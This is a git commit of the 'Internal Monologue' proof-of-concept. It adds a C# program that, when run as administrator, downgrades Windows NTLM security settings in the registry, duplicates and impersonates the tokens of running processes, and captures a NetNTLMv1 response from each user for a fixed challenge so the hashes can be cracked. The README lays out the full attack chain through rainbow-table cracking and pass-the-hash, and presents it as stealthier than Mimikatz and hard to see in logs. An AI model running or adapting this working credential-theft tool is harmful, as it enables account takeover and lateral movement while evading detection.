1604fac19099265a5ce2bae99fa71a7aeecbd23b
shamir <shamir@CORP.AMAZONWORKSPACES.COM>
2017-12-09 17:00:24 +1100

    First commit

---
+++ InternalMonologue/Program.cs
@@ -0,0 +1,465 @@
+﻿using System;
+using System.Security.Principal;
+using System.Runtime.InteropServices;
+using System.Text;
+using Microsoft.Win32;
+using System.Collections.Generic;
+
+namespace InternalMonologue
+{
+    class Program
+    {
+        const int MAX_TOKEN_SIZE = 12288;
+
+        [DllImport("secur32.dll", CharSet = CharSet.Auto)]
+        static extern int AcquireCredentialsHandle(
+            string pszPrincipal,
+            string pszPackage,
+            int fCredentialUse,
+            IntPtr PAuthenticationID,
+            IntPtr pAuthData,
+            int pGetKeyFn,
+            IntPtr pvGetKeyArgument,
+            ref SECURITY_HANDLE phCredential,
+            ref SECURITY_INTEGER ptsExpiry);
+
+        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern int InitializeSecurityContext(
+            ref SECURITY_HANDLE phCredential,
+            IntPtr phContext,
+            string pszTargetName,
+            int fContextReq,
+            int Reserved1,
+            int TargetDataRep,
+            IntPtr pInput,
+            int Reserved2,
+            out SECURITY_HANDLE phNewContext,
+            out SecBufferDesc pOutput,
+            out uint pfContextAttr,
+            out SECURITY_INTEGER ptsExpiry);
+
+        [DllImport("secur32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        static extern int InitializeSecurityContext(
+            ref SECURITY_HANDLE phCredential,
+            ref SECURITY_HANDLE phContext,  
+            string pszTargetName,
+            int fContextReq,
+            int Reserved1,
+            int TargetDataRep,
+            ref SecBufferDesc SecBufferDesc,
+            int Reserved2,
+            out SECURITY_HANDLE phNewContext,
+            out SecBufferDesc pOutput,
+            out uint pfContextAttr,
+            out SECURITY_INTEGER ptsExpiry);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool OpenProcessToken(
+            IntPtr ProcessHandle,
+            int DesiredAccess,
+            ref IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        private static extern bool DuplicateTokenEx(
+            IntPtr hExistingToken,
+            int dwDesiredAccess,
+            ref SECURITY_ATTRIBUTES lpThreadAttributes,
+            int ImpersonationLevel,
+            int dwTokenType,
+            ref IntPtr phNewToken);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        private static extern bool CloseHandle(
+            IntPtr hObject);
+
+        private static void GetRegKey(string key, string name, out object result)
+        {
+            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key);
+            if (Lsa != null)
+            {
+                object value = Lsa.GetValue(name);
+                if (value != null)
+                {
+                    result = value;
+                    return;
+                }
+            }
+            result = null;
+        }
+
+        private static void SetRegKey(string key, string name, object value)
+        {
+            RegistryKey Lsa = Registry.LocalMachine.OpenSubKey(key, true);
+            if (Lsa != null)
+            {
+                if (value == null)
+                {
+                    Lsa.DeleteValue(name);
+                }
+                else
+                {
+                    Lsa.SetValue(name, value);
+                }
+            }
+        }
+
+        private static void ExtendedNTLMDowngrade(out object oldValue_LMCompatibilityLevel, out object oldValue_NtlmMinClientSec, out object oldValue_RestrictSendingNTLMTraffic)
+        {
+            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", out oldValue_LMCompatibilityLevel);
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", 2);
+
+            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", out oldValue_NtlmMinClientSec);
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", 536870912);
+
+            GetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", out oldValue_RestrictSendingNTLMTraffic);
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", 0);
+        }
+
+        private static void NTLMRestore(object oldValue_LMCompatibilityLevel, object oldValue_NtlmMinClientSec, object oldValue_RestrictSendingNTLMTraffic)
+        {
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa", "LMCompatibilityLevel", oldValue_LMCompatibilityLevel);
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "NtlmMinClientSec", oldValue_NtlmMinClientSec);
+            SetRegKey("SYSTEM\\CurrentControlSet\\Control\\Lsa\\MSV1_0", "RestrictSendingNTLMTraffic", oldValue_RestrictSendingNTLMTraffic);
+        }
+        
+        static void Main(string[] args)
+        {
+            //Extended NetNTLM Downgrade and impersonation can only work if the current process is elevated
+            if (IsElevated())
+            {
+                //Perform an Extended NetNTLM Downgrade and store the current values to restore them later
+                object oldValue_LMCompatibilityLevel;
+                object oldValue_NtlmMinClientSec;
+                object oldValue_RestrictSendingNTLMTraffic;
+                ExtendedNTLMDowngrade(out oldValue_LMCompatibilityLevel, out oldValue_NtlmMinClientSec, out oldValue_RestrictSendingNTLMTraffic);
+
+                //Maintain a list of impersonated users
+                List<string> authenticatedUsers = new List<string>();
+                foreach (IntPtr token in GetTokens())
+                {
+                    try
+                    {
+                        using (WindowsImpersonationContext impersonatedUser = WindowsIdentity.Impersonate(token))
+                        {
+                            if (authenticatedUsers.Contains(WindowsIdentity.GetCurrent().Name) == false) //Impersonate each user only once
+                            {
+                                Console.WriteLine(WindowsIdentity.GetCurrent().Name + ":1122334455667788:" + ByteArrayToString(InternalMonologueForCurrentUser()));
+                                authenticatedUsers.Add(WindowsIdentity.GetCurrent().Name);
+                            }
+                        }
+                    }
+                    catch (Exception) { /*Does not need to do anything if it fails*/ };
+                }
+
+                //Undo changes made in the Extended NetNTLM Downgrade
+                NTLMRestore(oldValue_LMCompatibilityLevel, oldValue_NtlmMinClientSec, oldValue_RestrictSendingNTLMTraffic);
+            }
+            else
+            {
+                //If the process is not elevated, skip downgrade and impersonation and only perform an Internal Monologue Attack for the current user
+                Console.WriteLine("Not administrator/elevated");
+                Console.WriteLine("Current user response:" + ByteArrayToString(InternalMonologueForCurrentUser()));
+            }           
+        }
+
+        //This function performs an Internal Monologue Attack in the context of the current user and returns the NetNTLM response for the challenge 0x1122334455667788
+        private static byte[] InternalMonologueForCurrentUser()
+        {
+            SecBufferDesc ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
+
+            SECURITY_HANDLE _hOutboundCred;
+                _hOutboundCred.LowPart = _hOutboundCred.HighPart = IntPtr.Zero;
+            SECURITY_INTEGER ClientLifeTime;
+                ClientLifeTime.LowPart = 0;
+                ClientLifeTime.HighPart = 0;
+            SECURITY_HANDLE _hClientContext;
+            uint ContextAttributes = 0;
+
+            // Acquire credentials handle for current user
+            AcquireCredentialsHandle(
+                WindowsIdentity.GetCurrent().Name,
+                "NTLM",
+                2,
+                IntPtr.Zero,
+                IntPtr.Zero,
+                0,
+                IntPtr.Zero,
+                ref _hOutboundCred,
+                ref ClientLifeTime
+                );
+
+            // Get a type-1 message from NTLM SSP
+            InitializeSecurityContext(
+                ref _hOutboundCred,
+                IntPtr.Zero,
+                WindowsIdentity.GetCurrent().Name,
+                0x00000800,
+                0,
+                0x10,
+                IntPtr.Zero,
+                0,
+                out _hClientContext,
+                out ClientToken,
+                out ContextAttributes,
+                out ClientLifeTime
+                );
+            ClientToken.Dispose();
+
+            ClientToken = new SecBufferDesc(MAX_TOKEN_SIZE);
+            // Custom made type-2 message with the hard-coded challenge 0x1122334455667788
+            SecBufferDesc ServerToken = new SecBufferDesc(new byte[] { 78, 84, 76, 77, 83, 83, 80, 0, 2, 0, 0, 0, 0, 0, 0, 0, 40, 0, 0, 0, 1, 0x82, 0, 0, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88, 0, 0, 0, 0, 0, 0, 0 });
+            InitializeSecurityContext(
+                ref _hOutboundCred,
+                ref _hClientContext,
+                WindowsIdentity.GetCurrent().Name,
+                0x00000800,
+                0,
+                0x10,
+                ref ServerToken,
+                0,
+                out _hClientContext,
+                out ClientToken,
+                out ContextAttributes,
+                out ClientLifeTime
+                );
+            byte[] result = ClientToken.GetSecBufferByteArray();
+
+            ClientToken.Dispose();
+            ServerToken.Dispose();
+
+            //Extract the NetNTLM response from a type-3 message and return it
+            return ParseNTResponse(result);
+        }
+
+        //This function parses the NetNTLM response from a type-3 message
+        private static byte[] ParseNTResponse(byte[] message)
+        {
+            short nt_resp_len = Convert.ToInt16(message[20] + message[21] * 256);
+            short nt_resp_off = Convert.ToInt16(message[24] + message[25] * 256);
+            byte[] nt_resp = new byte[nt_resp_len];
+            Array.Copy(message, nt_resp_off, nt_resp, 0, nt_resp_len);
+            return nt_resp;
+        }
+
+        //The following function is taken from https://stackoverflow.com/questions/311165/how-do-you-convert-a-byte-array-to-a-hexadecimal-string-and-vice-versa
+        private static string ByteArrayToString(byte[] ba)
+        {
+            StringBuilder hex = new StringBuilder(ba.Length * 2);
+            foreach (byte b in ba)
+                hex.AppendFormat("{0:x2}", b);
+            return hex.ToString();
+        }
+
+        //This function is taken from http://amiryonatan.blogspot.com.au/2013/01/impersonating-currentuser_26.html
+        private static IntPtr GetPrimaryToken(System.Diagnostics.Process process)
+        {
+            var token = IntPtr.Zero;
+            var primaryToken = IntPtr.Zero;
+
+            if (OpenProcessToken(process.Handle, 0x0002, ref token))
+            {
+                var sa = new SECURITY_ATTRIBUTES();
+                sa.nLength = Marshal.SizeOf(sa);
+
+                DuplicateTokenEx(
+                    token,
+                    0x0002 | 0x0008,
+                    ref sa,
+                    (int)SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                    (int)1,
+                    ref primaryToken);
+                
+                CloseHandle(token);
+            }
+
+            return primaryToken;
+        }
+
+        private static List<IntPtr> GetTokens()
+        {
+            System.Diagnostics.Process[] processes = System.Diagnostics.Process.GetProcesses();
+            List<IntPtr> tokens = new List<IntPtr>();
+
+            foreach (System.Diagnostics.Process process in processes)
+            {
+                if (process.ProcessName.Contains("lsass") == false) // Do not touch LSASS
+                {
+                    try
+                    {
+                        tokens.Add(GetPrimaryToken(process));
+                    }
+                    catch (Exception e) { /*Does not need to do anything if it fails*/ }
+                }
+            }
+            return tokens;
+        }
+
+        //This function is taken from https://stackoverflow.com/questions/3600322/check-if-the-current-user-is-administrator
+        private static bool IsElevated()
+        {
+            return (new WindowsPrincipal(WindowsIdentity.GetCurrent())).IsInRole(WindowsBuiltInRole.Administrator);
+        }
+    }
+
+    public struct SecBuffer : IDisposable
+    {
+        public int cbBuffer;
+        public int BufferType;
+        public IntPtr pvBuffer;
+
+        public SecBuffer(int bufferSize)
+        {
+            cbBuffer = bufferSize;
+            BufferType = 2;
+            pvBuffer = Marshal.AllocHGlobal(bufferSize);
+        }
+
+        public SecBuffer(byte[] secBufferBytes)
+        {
+            cbBuffer = secBufferBytes.Length;
+            BufferType = 2;
+            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
+            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
+        }
+
+        public SecBuffer(byte[] secBufferBytes, int bufferType)
+        {
+            cbBuffer = secBufferBytes.Length;
+            BufferType = (int)bufferType;
+            pvBuffer = Marshal.AllocHGlobal(cbBuffer);
+            Marshal.Copy(secBufferBytes, 0, pvBuffer, cbBuffer);
+        }
+
+        public void Dispose()
+        {
+            if (pvBuffer != IntPtr.Zero)
+            {
+                Marshal.FreeHGlobal(pvBuffer);
+                pvBuffer = IntPtr.Zero;
+            }
+        }
+    }
+
+    public struct SecBufferDesc : IDisposable
+    {
+        public int ulVersion;
+        public int cBuffers;
+        public IntPtr pBuffers;
+
+        public SecBufferDesc(int bufferSize)
+        {
+            ulVersion = 0;
+            cBuffers = 1;
+            SecBuffer ThisSecBuffer = new SecBuffer(bufferSize);
+            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
+            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
+        }
+
+        public SecBufferDesc(byte[] secBufferBytes)
+        {
+            ulVersion = 0;
+            cBuffers = 1;
+            SecBuffer ThisSecBuffer = new SecBuffer(secBufferBytes);
+            pBuffers = Marshal.AllocHGlobal(Marshal.SizeOf(ThisSecBuffer));
+            Marshal.StructureToPtr(ThisSecBuffer, pBuffers, false);
+        }
+
+        public void Dispose()
+        {
+            if (pBuffers != IntPtr.Zero)
+            {
+                if (cBuffers == 1)
+                {
+                    SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
+                    ThisSecBuffer.Dispose();
+                }
+                else
+                {
+                    for (int Index = 0; Index < cBuffers; Index++)
+                    {
+                        int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
+                        IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
+                        Marshal.FreeHGlobal(SecBufferpvBuffer);
+                    }
+                }
+
+                Marshal.FreeHGlobal(pBuffers);
+                pBuffers = IntPtr.Zero;
+            }
+        }
+
+        public byte[] GetSecBufferByteArray()
+        {
+            byte[] Buffer = null;
+
+            if (pBuffers == IntPtr.Zero)
+            {
+                throw new InvalidOperationException("Object has already been disposed!!!");
+            }
+
+            if (cBuffers == 1)
+            {
+                SecBuffer ThisSecBuffer = (SecBuffer)Marshal.PtrToStructure(pBuffers, typeof(SecBuffer));
+
+                if (ThisSecBuffer.cbBuffer > 0)
+                {
+                    Buffer = new byte[ThisSecBuffer.cbBuffer];
+                    Marshal.Copy(ThisSecBuffer.pvBuffer, Buffer, 0, ThisSecBuffer.cbBuffer);
+                }
+            }
+            else
+            {
+                int BytesToAllocate = 0;
+
+                for (int Index = 0; Index < cBuffers; Index++)
+                {
+                    //calculate the total number of bytes we need to copy...
+                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
+                    BytesToAllocate += Marshal.ReadInt32(pBuffers, CurrentOffset);
+                }
+
+                Buffer = new byte[BytesToAllocate];
+
+                for (int Index = 0, BufferIndex = 0; Index < cBuffers; Index++)
+                {
+                    //Now iterate over the individual buffers and put them together into a byte array...
+                    int CurrentOffset = Index * Marshal.SizeOf(typeof(SecBuffer));
+                    int BytesToCopy = Marshal.ReadInt32(pBuffers, CurrentOffset);
+                    IntPtr SecBufferpvBuffer = Marshal.ReadIntPtr(pBuffers, CurrentOffset + Marshal.SizeOf(typeof(int)) + Marshal.SizeOf(typeof(int)));
+                    Marshal.Copy(SecBufferpvBuffer, Buffer, BufferIndex, BytesToCopy);
+                    BufferIndex += BytesToCopy;
+                }
+            }
+
+            return (Buffer);
+        }
+    }
+
+    public struct SECURITY_INTEGER
+    {
+        public uint LowPart;
+        public int HighPart;
+    };
+
+    public struct SECURITY_HANDLE
+    {
+        public IntPtr LowPart;
+        public IntPtr HighPart;
+
+    };
+
+    public struct SECURITY_ATTRIBUTES
+    {
+        public int nLength;
+        public IntPtr lpSecurityDescriptor;
+        public bool bInheritHandle;
+    }
+
+    public enum SECURITY_IMPERSONATION_LEVEL
+    {
+        SecurityAnonymous,
+        SecurityIdentification,
+        SecurityImpersonation,
+        SecurityDelegation
+    }
+}
---
+++ README.md
@@ -0,0 +1,65 @@
+# Internal Monologue Attack: Retrieving NTLM Hashes without Mimikatz
+*By Elad Shamir, The Missing Link Security*
+
+## Introduction
+Mimikatz, developed by Benjamin Delpy (@gentilkiwi), is a well-regarded post-exploitation tool, which allows adversaries to extract plain text passwords, NTLM hashes and Kerberos tickets from memory, as well as perform attacks such as pass-the-hash, pass-the-ticket or build a golden ticket. Arguably, the primary use of Mimikatz is retrieving user credentials from LSASS process memory for use in post exploitation lateral movement.
+
+Recently, Microsoft has introduced Credential Guard in Windows 10 Enterprise and Windows Server 2016, which uses virtualization-based security to isolate secrets, and it is very effective in preventing Mimikatz from retrieving hashes directly from memory.
+Also, Mimikatz has become a prime target of most endpoint protection solutions, from Windows Defender to FireEye HX, and they are very aggressive in their efforts to detect and prevent it. Although these efforts are bound to fail, they are increasingly becoming a nuisance.
+
+## NetNTLM
+NetNTLM is Windows’ challenge-response protocol that is mainly used where Kerberos is not supported. In NetNTLM, the server sends to the client a random 8-byte nonce as a challenge, and the client calculates a response that processes the challenge with the NTLM hash as the key, which is the MD4 hash of the user’s password. There are two versions of the NetNTLM authentication protocol, and both are vulnerable to certain attacks. Naturally, version 1 is significantly weaker than version 2, and therefore as of Windows Vista/2008 NetNTLM version 1 is disabled by default.
+
+
+## Pass the Hash
+Because the NTLM hash is the key to calculating the response, an adversary does not necessarily need to obtain the victim’s plain text password to authenticate, hence retrieving the hash from LSASS memory using Mimikatz is almost equivalent to stealing a plain text password. 
+Chris Hummel has published an article describing this technique in 2009 and named it “Pass the Hash” [https://www.sans.org/reading-room/whitepapers/testing/crack-pass-hash-33219].
+
+## Divide and Conquer
+At Defcon 2012, Moxie Marlinspike and David Hulton presented a “Divide and Conquer” attack against NetNTLMv1 [https://www.youtube.com/watch?v=sIidzPntdCM]. In NetNTLMv1, the client receives the 8-byte challenge and calculates the response by encrypting it three times using DES with the different parts of the NTLM hash as the key. The key length for DES is effectively 56 bits, which is 7 bytes, while the NTLM hash is 16 bytes. NetNTLMv1 first encrypts the challenge using the first 7 bytes of the NTLM hash as the key, then encrypts the challenge using the next 7 bytes of the NTLM hash as the key, and finally encrypts the challenge using the last 2 bytes of the NTLM hash padded with null-bytes as the key. Effectively, this means that to retrieve the NTLM hash given a NetNTLMv1 challenge and response, an adversary must crack two 56-bit DES keys, which is exponentially easier than cracking a single 128-bit key.
+Moxie and Hulton developed custom hardware for this task and were able to brute-force the entire DES keyspace in less than 24 hours, which guarantees the successful retrieval of the NTLM hash within a reasonable time.
+Note that unlike dictionary or brute force attacks against the password, which may not be fruitful, this attack guarantees the successful retrieval of the NTLM hash.
+
+
+## Rainbow Tables
+As demonstrated by ToorCon at https://crack.sh, it is feasible to create a complete rainbow table for all the possible NetNTLMv1 responses to a chosen challenge, such as 0x1122334455667788, which allows cracking the NTLM hash for a given response within minutes. The implication is that capturing a NetNTLMv1 response for the chosen challenge can be translated to the corresponding NTLM hash almost instantly, which is almost the equivalent to obtaining the password due to Pass the Hash.
+
+## NetNTLM Downgrade Attack
+Mimikatz is commonly executed after the adversary has gained elevated access to the target host. At this point, the adversary can also change registry keys, such as LMCompatibilityLevel, which specifies whether the host should negotiate NetNTLMv1 or NetNTLMv2. The adversary can change the value to 0, 1 or 2, which enable NetNTLMv1 as a client, and then try to authenticate to a rogue SMB server that will capture the client’s response, as described in Optiv’s blog post [https://www.optiv.com/blog/post-exploitation-using-netntlm-downgrade-attacks].
+
+## Extended NetNTLM Downgrade Attack
+Two more settings may stop the victim from negotiating a NetNTLMv1 response:
+NTLMMinClientSec - if configured to “Require NTLMv2 session security”, the connection will fail if NTLMv2 protocol is not negotiated.
+RestrictSendingNTLMTraffic - if configured to "Deny all," the client computer cannot authenticate to a remote server with NetNTLM of any version.
+Similarly to the NetNTLM Downgrade attack, these settings can be changed if necessary. Note that unlike LMCompatibilityLevel, these settings are not configured by default to block NetNTLMv1 authentication.
+
+Internal Monologue Attack
+In secure environments, where Mimikatz should not be executed due to controls such as Credential Guard, an adversary can perform an Internal Monologue Attack, in which they invoke a local procedure call to the NTLM authentication package (MSV1_0) from a user-mode application through SSPI to calculate a NetNTLM response in the context of the logged on user, after performing an extended NetNTLM downgrade.
+
+The Internal Monologue Attack flow is described below:
+1. Disable NetNTLMv1 preventive controls by changing LMCompatibilityLevel, NTLMMinClientSec and RestrictSendingNTLMTraffic to appropriate values, as described above.
+2. Retrieve all non-network logon tokens from currently running processes and impersonate the associated users.
+3. For each impersonated user, interact with NTLM SSP locally to elicit a NetNTLMv1 response to the chosen challenge in the security context of the impersonated user.
+4. Restore the original values of LMCompatibilityLevel, NTLMMinClientSec and RestrictSendingNTLMTraffic.
+5. Crack the NTLM hash of the captured responses using rainbow tables.
+6. Pass the Hash.
+
+## Audit Trail
+The Internal Monologue Attack is arguably stealthier than running Mimikatz because there is no need to inject code or dump memory to/from a protected process.
+Because the NetNTLMv1 response is elicited by interacting with NTLM SSP locally, no network traffic is generated, and the chosen challenge is not easily visible.
+No successful NTLM authentication event is recorded in the logs.
+Please let me know if I am missing something and it is louder than I think.
+
+## Proof of Concept
+This tool is a proof of concept that implements the Internal Monologue Attack in C#. Porting the code to PowerShell may substitute certain event logs in the audit trail with others.
+The PoC code is far from perfect. Positive contributions and improvements are welcome.
+
+## Authors
+Elad Shamir from The Missing Link Security
+
+## Acknowledgements
+* Matthew Bush (3xocyte) from The Missing Link Security and Shaun Williamson (AusJock) from Beyond Binary for helping bounce off ideas and put this together
+* Moxie Marlinspike and David Hulton for their talk “Defeating PPTP VPNs and WPA2 Enterprise with MS-CHAPv2” at Defcon 20
+* Optiv for the NetNTLM Downgrade Attack
+* Bialek Joseph (clymb3r) for Invoke-TokenManupilation 
+* Microsoft for coming up with great ideas and never disappointing
